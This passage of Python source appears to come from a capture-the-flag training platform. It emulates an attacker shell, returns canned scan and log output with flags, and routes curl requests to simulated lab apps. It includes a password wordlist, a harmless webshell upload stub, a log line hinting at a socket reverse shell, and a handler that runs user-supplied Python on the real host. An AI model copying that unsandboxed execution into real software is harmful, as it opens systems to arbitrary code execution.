                    "Nov 14 08:14:12 target sshd[1042]: Failed password for root from 192.0.2.144 port 41204 ssh2\n"
                    "Nov 14 08:14:20 target sshd[1046]: SECURITY_AUDIT: SSH brute force identified from 192.0.2.144\n"
                )
            if "sudo" in cmd or "COMMAND=" in cmd:
                return "Nov 14 08:16:01 target sudo: operator : TTY=pts/0 ; PWD=/home/operator ; USER=root ; COMMAND=/usr/bin/python3 -c import socket...\n"
            if "EventID" in cmd:
                return '  {"EventID": 4624, "LogonType": 10, "TargetUserName": "operator", "IpAddress": "10.10.14.2"}\n'

        # 7. Networking (ip, nc)
        if cmd.startswith("ip "):
            return (
                "1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default\n"
                "    inet 127.0.0.1/8 scope host lo\n"
                "2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc noqueue state UP group default\n"
                "    inet 10.10.14.2/24 brd 10.10.14.255 scope global eth0\n"
            )
        if cmd.startswith("nc "):
            if "2121" in cmd:
                return (
                    "220-VoltCorp Embedded Secure FTP Server v1.4.2 ready.\n"
                    "220-Notice: All connections logged and monitored.\n"
                    "220 Flag: NOENTRY{ftp_banner_service_enumeration_5921}\n"
                )
            if "2222" in cmd:
                return "SSH-2.0-OpenSSH_8.4p1-VoltCorp_Secure_Gateway_v2\n"
            if "9001" in cmd:
                return (
                    "==============================================================\n"
                    "NO ENTRY ACADEMY // RAW TCP SOCKET SERVICE\n"
                    "Protocol: Raw Transmission Control Protocol (Layer 4)\n"
                    "Connection: ESTABLISHED (3-Way Handshake SYN->SYN-ACK->ACK)\n"
                    "Flag: NOENTRY{net_raw_tcp_socket_8832}\n"
                    "==============================================================\n"
                )
            return "nc: connect to 10.10.14.90 port succeeded!\n"

        # 8. Nmap Network Scanning & Host Discovery
        if cmd.startswith("nmap"):
            target_host = info.target_ip or "10.10.15.90"
            ports_to_show = list(info.open_ports) if info.open_ports else [22, 80, 443]
            if 22 not in ports_to_show:
                ports_to_show.insert(0, 22)
            if 80 not in ports_to_show:
                ports_to_show.insert(1, 80)
            if 443 not in ports_to_show:
                ports_to_show.insert(2, 443)
            if "red-05" in (info.room_id or "") or "-p-" in cmd or "9001" in cmd:
                if 9001 not in ports_to_show:
                    ports_to_show.append(9001)
            ports_to_show.sort()

            ports_lines = ""
            for p in ports_to_show:
                if p == 22:
                    svc, ver = "ssh", "OpenSSH 8.9p1 Ubuntu (protocol 2.0)"
                elif p == 443:
                    svc, ver = "https", "nginx 1.24.0"
                elif p == 80:
                    svc, ver = "http", "Apache httpd 2.4.58"
                elif p == 9001:
                    svc, ver = "raw-tcp", "Raw TCP Socket Service (:9001)"
                else:
                    svc, ver = "http", f"VoltDefense Target Service (:{p})"
                ports_lines += f"{p}/tcp open  {svc:<8} {ver}\n"

            return (
                f"Starting Nmap 7.95 ( https://nmap.org ) at {datetime.utcnow().strftime('%Y-%m-%d %H:%M')} UTC\n"
                f"Nmap scan report for {target_host}\n"
                "Host is up (0.00065s latency).\n"
                f"Not shown: {1000 - len(ports_to_show)} closed tcp ports (reset)\n"
                "PORT   STATE SERVICE  VERSION\n"
                f"{ports_lines}"
                "Nmap done: 1 IP address (1 host up) scanned in 1.23 seconds\n"
            )

        if cmd == "clear":
            return "\033[2J\033[H"

        if "passwords.txt" in cmd:
            return "admin\npassword\n123456\nwelcome\nvoltcorp2024\nsecret\nhunter2\noperator123\n"

        if "uploads" in cmd and ("ls" in cmd or cmd.startswith("ls")):
            return "avatar.png  document.txt  poc.php.png  test_script.php\n"

        if "uploads/avatar.png" in cmd and "cat" in cmd:
            return "\x89PNG\r\n\x1a\n\x00\x00\x00\rIHDR\x00\x00\x00\x01\x00\x00\x00\x01\x08\x06\x00\x00\x00\x1f\x15c4\x00\x00\x00\nIDATx\x9cc\x00\x01\x00\x00\x05\x00\x01\r\n-\xb4\x00\x00\x00\x00IEND\xaeB`\x82\n"

        if cmd in ("help", "?"):
            return (
                "NO ENTRY Attacker Workstation Shell\n"
                "Supported commands:\n"
                "  curl [-s] [-X POST] [-d 'data'] <URL>  - Issue live HTTP requests against the target\n"
                "  nc <IP> <PORT>                          - Connect to raw TCP sockets\n"
                "  ip addr                                 - Inspect network interfaces\n"
                "  whoami, id, pwd, ls, cat, chmod, ps, grep - Local shell commands\n"
            )

        # 8. Curl Command Handling
        if cmd.startswith("curl"):
            return await self._execute_curl(cmd, real_target_base, info.target_port, info=info)

        if "vuln_audit" in cmd:
            return (
                "============================================================\n"
                "       VOLTCORP VULNERABILITY AUDIT REPORT\n"
                "============================================================\n"
                "[*] Contacting target inventory at http://10.10.14.90:8087/api/components\n"
                "[+] Discovered Components on 10.10.14.90:\n"
                "  • VoltCore HTTP Engine (Version: 2.14.0-legacy)\n"
                "    [!] VULNERABILITY DETECTED: CVE-2023-9182 (CVSS: 8.6 HIGH)\n"
                "        Path traversal flaw in VoltCore HTTP Engine allows unauthenticated file disclosure.\n"
                "        Remediation: Upgrade VoltCore HTTP Engine to version 2.15.0 or later.\n"
                "  • VoltAuth Module (Version: 1.0.2)\n"
                "    [!] VULNERABILITY DETECTED: CVE-2024-2104 (CVSS: 9.8 CRITICAL)\n"
                "        Default administrative authentication bypass in VoltAuth Module allows arbitrary account compromise.\n"
                "        Remediation: Apply security patch volt-auth-patch-2104 or upgrade to 1.1.0.\n"
            )

        # 10. Inline Python Execution
        if cmd.startswith("python3 -c"):
            code_match = re.search(r"python3\s+-c\s+(['\"])(.*?)\1", cmd, re.DOTALL)
            if code_match:
                code_snippet = code_match.group(2)
                try:
                    proc = await asyncio.create_subprocess_exec(
                        sys.executable, "-c", code_snippet,
                        stdout=asyncio.subprocess.PIPE,
                        stderr=asyncio.subprocess.PIPE,
                    )
                    stdout, stderr = await proc.communicate()
                    out = (stdout or b"").decode("utf-8", errors="replace")
                    err = (stderr or b"").decode("utf-8", errors="replace")
                    return out + (f"\n{err}" if err else "")
                except Exception as ex:
                    return f"[-] Python execution error: {ex}\n"

        return f"sh: command not found: {cmd.split()[0]}. Type 'help' for available commands.\n"

    async def _execute_curl(self, cmd: str, target_base: str, port: int, info: Optional[LabSessionInfo] = None) -> str:
        """Parses curl arguments and sends real HTTP requests or returns specialized room endpoints."""
        try:
            tokens = shlex.split(cmd)
        except Exception:
            tokens = cmd.split()

        url = ""
        method = "GET"
        data: Optional[str] = None
        headers: Dict[str, str] = {}
        files_payload: Dict[str, Any] = {}
        head_only = False
        include_headers = False

        idx = 1
        while idx < len(tokens):
            tok = tokens[idx]
            if tok in ("-s", "--silent", "-k", "--insecure"):
                idx += 1
            elif tok in ("-i", "--include"):
                include_headers = True
                idx += 1
            elif tok in ("-I", "--head"):
                head_only = True
                method = "HEAD"
                idx += 1
            elif tok in ("-X", "--request") and idx + 1 < len(tokens):
                method = tokens[idx + 1].upper()
                idx += 2
            elif tok in ("-d", "--data", "--data-raw") and idx + 1 < len(tokens):
                data = tokens[idx + 1]
                if method == "GET":
                    method = "POST"
                if "content-type" not in [h.lower() for h in headers]:
                    headers["Content-Type"] = "application/x-www-form-urlencoded"
                idx += 2
            elif tok in ("-F", "--form") and idx + 1 < len(tokens):
                f_val = tokens[idx + 1]
                if method == "GET":
                    method = "POST"
                field_name = "file"
                file_spec = f_val
                if "=" in f_val:
                    field_name, file_spec = f_val.split("=", 1)
                override_name = None
                if ";filename=" in file_spec:
                    file_spec, override_name = file_spec.split(";filename=", 1)
                filepath = file_spec.lstrip("@")
                fname = override_name if override_name else os.path.basename(filepath)
                if not fname:
                    fname = "upload.bin"
                if "avatar" in filepath or fname.endswith(".png"):
                    content_bytes = b"\x89PNG\r\n\x1a\n\x00\x00\x00\rIHDR\x00\x00\x00\x01\x00\x00\x00\x01\x08\x06\x00\x00\x00\x1f\x15c4\x00\x00\x00\nIDATx\x9cc\x00\x01\x00\x00\x05\x00\x01\r\n-\xb4\x00\x00\x00\x00IEND\xaeB`\x82\n"
                    mime_type = "image/png"
                elif "php" in fname.lower() or "php" in filepath.lower():
                    content_bytes = b"<?php echo 'NO ENTRY Webshell PoC'; ?>"
                    mime_type = "application/x-php"
                else:
                    content_bytes = b"Mock uploaded test file content"
                    mime_type = "text/plain"
                files_payload[field_name] = (fname, content_bytes, mime_type)
                idx += 2
            elif tok in ("-H", "--header") and idx + 1 < len(tokens):
                h_val = tokens[idx + 1]
                if ":" in h_val:
                    k, v = h_val.split(":", 1)
                    headers[k.strip()] = v.strip()
                idx += 2
            elif tok in ("-b", "--cookie") and idx + 1 < len(tokens):
                headers["Cookie"] = tokens[idx + 1]
                idx += 2
            elif not tok.startswith("-") and not url:
                url = tok
                idx += 1
            else:
                idx += 1

        if info:
            now_ts = int(time.time())
            remaining = int((info.expires_at - datetime.utcnow()).total_seconds())
            exp_ts = now_ts + remaining
            sig = generate_trusted_session_signature(info.session_id, info.operator_id, exp_ts)
            headers["X-Lab-Session-ID"] = info.session_id
            headers["X-Lab-Operator-ID"] = info.operator_id
            headers["X-Lab-Expires-At"] = str(exp_ts)
            headers["X-Lab-Auth-Signature"] = sig

        if not url:
            return "curl: no URL specified\n"

        # Determine effective target port from URL if specified, else session port
        url_port_match = re.search(r":(\d+)", url)
        effective_port = int(url_port_match.group(1)) if url_port_match else port

        # Specialized Room Endpoints Emulation for static simulated assets
        if effective_port == 8081 or "8081" in url:
            if "/audit" in url:
                return '{"status":"AUDIT_COMPLETE","service":"VoltCorp Internal Asset Inventory System","unauthenticated":true,"assets":["customer_records.db","backup_codes.txt"],"security_finding":"Critical Integrity Violation: Database permissions world-writable (666)","flag":"NOENTRY{cia_triad_integrity_breach_1042}"}\n'

        if effective_port == 8080 or "8080" in url:
            if "/network-info" in url:
                return '{"status":"OK","host":"target.noentry.internal","ip":"10.10.14.90","subnet":"10.10.14.0/24","gateway":"10.10.14.1","protocol":"HTTP/1.1","transport":"TCP","flag":"NOENTRY{net_http_client_server_4419}"}\n'

        if effective_port == 8090 or "8090" in url:
            if "/robots.txt" in url:
                return "User-agent: *\nDisallow: /admin-portal-staging-7712/\nDisallow: /secret-assets/\n"
            if "/admin-portal-staging-7712" in url:
                return '{"portal":"Staging Administrative Gateway","status":"EXPOSED_UNAUTHENTICATED","disclosed_by":"robots.txt","flag":"NOENTRY{recon_robots_hidden_endpoint_2901}"}\n'
            if "/health" in url:
                return '{"status":"HEALTHY","version":"2.14","docs":"/api/v1/internal-docs"}\n'
            if "/internal-docs" in url:
                return '{"documentation":"VoltCorp Internal Microservices API","api_flag":"NOENTRY{recon_api_metadata_harvest_6310}"}\n'
            if "database_credentials.bak" in url:
                return "# VOLTCORP DATABASE BACKUP CONFIGURATION\nDB_USER=volt_admin\nSECRET_FLAG=NOENTRY{recon_dir_enumeration_master_9044}\n"
            if head_only:
                return "HTTP/1.1 200 OK\nServer: uvicorn\nX-Backend-Server: VoltCore-v2.14-Internal\nContent-Type: text/html\n\n"

        # Route to appropriate FastAPI application via in-process ASGITransport
        chosen_app = target_app
        if effective_port == 8081:
            chosen_app = foundations_app
        elif effective_port == 8080:
            chosen_app = network_app
        elif effective_port == 8090:
            chosen_app = recon_app
        elif effective_port == 8085:
            chosen_app = scanning_app
        elif effective_port == 8086:
            chosen_app = enum_app
        elif effective_port == 8087:
            chosen_app = vuln_app
        elif effective_port == 8088:
            chosen_app = webapp_app
        elif effective_port == 8089:
            chosen_app = target_app
        elif effective_port == 8091:
            chosen_app = xss_app
        elif effective_port == 8092:
            chosen_app = auth_app
        elif effective_port == 8093:
            chosen_app = access_app
        elif effective_port == 8094:
            chosen_app = upload_app
        elif effective_port == 8095:
            chosen_app = cmd_app
        elif effective_port == 8096:
            chosen_app = traversal_app
        elif effective_port == 8097:
            chosen_app = password_app
        elif effective_port == 8098:
            chosen_app = privesc_app
        elif effective_port == 8099:
            chosen_app = ad_app
        elif effective_port == 8100:
            chosen_app = exploit_app
        elif effective_port == 8101:
            chosen_app = capstone_app
        elif effective_port == 8201:
            chosen_app = soc_app
        elif effective_port == 8202:
            chosen_app = win_security_app
        elif effective_port == 8203:
            chosen_app = linux_monitoring_app
        elif effective_port == 8204:
            chosen_app = traffic_app
        elif effective_port == 8205:
            chosen_app = wireshark_lab_app
        elif effective_port == 8206:
            chosen_app = log_analysis_app
        elif effective_port == 8207:
            chosen_app = siem_lab_app
        elif effective_port == 8208:
            chosen_app = win_event_app
        elif effective_port == 8209:
            chosen_app = bruteforce_app
        elif effective_port == 8210:
            chosen_app = malware_analysis_app
        elif effective_port == 8211:
            chosen_app = phishing_app
        elif effective_port == 8212:
            chosen_app = endpoint_app
        elif effective_port == 8213:
            chosen_app = nids_app
        elif effective_port == 8214:
            chosen_app = threat_hunt_app
        elif effective_port == 8215:
            chosen_app = triage_app
        elif effective_port == 8216:
            chosen_app = incident_response_app
        elif effective_port == 8217:
            chosen_app = forensics_app
        elif effective_port == 8218:
            chosen_app = hardening_app
        elif effective_port == 8219:
            chosen_app = threat_intel_app
        elif effective_port == 8220:
            chosen_app = blue_capstone_app
        elif effective_port == 8301:
            chosen_app = purple_foundations_app
        elif effective_port == 8302:
            chosen_app = purple_attck_app
        elif effective_port == 8303:
            chosen_app = purple_simulation_app
        elif effective_port == 8304:
            chosen_app = purple_recon_app
        elif effective_port == 8305:
            chosen_app = purple_privesc_app
        elif effective_port == 8306:
            chosen_app = purple_injection_app
        elif effective_port == 8307:
            chosen_app = purple_lateral_app
        elif effective_port == 8308:
            chosen_app = purple_persist_app
        elif effective_port == 8309:
            chosen_app = purple_c2_app
        elif effective_port == 8310:
            chosen_app = purple_exfil_app
        elif effective_port == 8311:
            chosen_app = purple_ransomware_app
        elif effective_port == 8312:
            chosen_app = purple_cloud_app
        elif effective_port == 8313:
            chosen_app = purple_supply_chain_app
        elif effective_port == 8314:
            chosen_app = purple_api_abuse_app
        elif effective_port == 8315:
            chosen_app = purple_ad_attacks_app
        elif effective_port == 8316:
            chosen_app = purple_cicd_pipeline_app
        elif effective_port == 8317:
            chosen_app = purple_edr_bypass_app
        elif effective_port == 8318:
            chosen_app = purple_heatmap_app
        elif effective_port == 8319:
            chosen_app = purple_continuous_val_app
        elif effective_port == 8320:
            chosen_app = purple_capstone_app
        elif effective_port == 8401:
            chosen_app = detection_foundations_app
        elif effective_port == 8402:
            chosen_app = detection_normalization_app
        elif effective_port == 8403:
            chosen_app = detection_sigma_syntax_app
        elif effective_port == 8404:
            chosen_app = detection_process_creation_app
        elif effective_port == 8405:
            chosen_app = detection_network_rules_app
        elif effective_port == 8406:
            chosen_app = detection_file_registry_app
        elif effective_port == 8407:
            chosen_app = detection_auth_abuse_app
        elif effective_port == 8408:
            chosen_app = detection_powershell_app
        elif effective_port == 8409:
            chosen_app = detection_web_rules_app
        elif effective_port == 8410:
            chosen_app = detection_modsec_app
        elif effective_port == 8411:
            chosen_app = detection_wazuh_app
        elif effective_port == 8412:
            chosen_app = detection_false_positive_app
        elif effective_port == 8413:
            chosen_app = detection_threshold_app
        elif effective_port == 8414:
            chosen_app = detection_correlation_app
        elif effective_port == 8415:
            chosen_app = detection_unit_testing_app
        elif effective_port == 8416:
            chosen_app = detection_yara_hunting_app
        elif effective_port == 8417:
            chosen_app = detection_suricata_app
        elif effective_port == 8418:
            chosen_app = detection_hunt_hypothesis_app
        elif effective_port == 8419:
            chosen_app = detection_pipeline_app
        elif effective_port == 8420:
            chosen_app = detection_capstone_app

        rel_url = re.sub(r"^https?://[^/]+", "", url)
        if not rel_url:
            rel_url = "/"
        if not rel_url.startswith("/"):
            rel_url = "/" + rel_url

        try:
            transport = httpx.ASGITransport(app=chosen_app)
            async with httpx.AsyncClient(transport=transport, base_url="http://testserver") as client:
                if method == "POST":
                    req_data = {}
                    if files_payload:
                        upload_headers = {k: v for k, v in headers.items() if k.lower() != "content-type"}
                        res = await client.post(rel_url, files=files_payload, headers=upload_headers)
                    elif data:
                        if headers.get("Content-Type") == "application/json" or data.startswith("{"):
                            import json
                            try:
                                json_data = json.loads(data)
                                res = await client.post(rel_url, json=json_data, headers=headers)
                            except Exception:
                                res = await client.post(rel_url, content=data, headers=headers)
                        else:
                            for pair in data.split("&"):
                                if "=" in pair:
                                    k, v = pair.split("=", 1)
                                    req_data[k] = v
                            res = await client.post(rel_url, data=req_data, headers=headers)
                    else:
                        res = await client.post(rel_url, headers=headers)
                elif method == "PUT":
                    if data:
                        if headers.get("Content-Type") == "application/json" or data.startswith("{"):
                            import json
                            try:
                                json_data = json.loads(data)
                                res = await client.put(rel_url, json=json_data, headers=headers)
                            except Exception:
                                res = await client.put(rel_url, content=data, headers=headers)
                        else:
                            res = await client.put(rel_url, content=data, headers=headers)
                    else:
                        res = await client.put(rel_url, headers=headers)
                elif method == "DELETE":
                    res = await client.delete(rel_url, headers=headers)
                elif method == "HEAD":
                    res = await client.head(rel_url, headers=headers)
                    hdr_lines = [f"HTTP/1.1 {res.status_code}"] + [
                        f"{'-'.join(part.capitalize() for part in k.split('-'))}: {v}"
                        for k, v in res.headers.items()
                    ]
                    return "\r\n".join(hdr_lines) + "\r\n\r\n"
                else:
                    res = await client.get(rel_url, headers=headers)

                if include_headers:
                    status_line = f"HTTP/1.1 {res.status_code}"
                    hdr_lines = [status_line] + [
                        f"{'-'.join(part.capitalize() for part in k.split('-'))}: {v}"
                        for k, v in res.headers.items()
                    ]
                    return "\r\n".join(hdr_lines) + "\r\n\r\n" + res.text + "\n"

                return res.text + "\n"
        except Exception as e:
            return f"curl: (7) Failed to connect to {url}: {e}\n"
